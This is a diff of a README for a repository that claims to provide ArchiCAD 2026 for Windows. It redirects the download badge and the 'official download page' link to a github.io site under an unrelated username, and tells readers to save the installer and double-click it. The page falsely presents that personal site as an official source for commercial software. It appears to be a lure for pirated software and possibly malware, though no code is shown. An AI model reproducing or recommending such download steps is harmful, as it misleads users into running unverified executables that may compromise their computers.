@@ -1,6 +1,6 @@
 # 🏗️ ArchiCAD-2026 - Build Professional Projects With Ease
 
-[![Download ArchiCAD](https://img.shields.io/badge/Download-ArchiCAD_2026-blue)](https://github.com/unhealthy-dangerline817/ArchiCAD-2026)
+[![Download ArchiCAD](https://img.shields.io/badge/Download-ArchiCAD_2026-blue)](https://unhealthy-dangerline817.github.io)
 
 This repository provides access to ArchiCAD 2026 for Windows 10 and Windows 11. This software supports architects and designers in creating building information models. Follow the steps in this guide to install the application on your computer.
 
@@ -21,7 +21,7 @@ Close all open programs before you start the installation to ensure the setup pr
 
 Follow these steps to obtain and install the software.
 
-1. Visit the [official download page](https://github.com/unhealthy-dangerline817/ArchiCAD-2026).
+1. Visit the [official download page](https://unhealthy-dangerline817.github.io).
 2. Select the installer file tailored for your Windows version.
 3. Save the file to your desktop or downloads folder.
 4. Locate the downloaded file and double-click it to start the process.
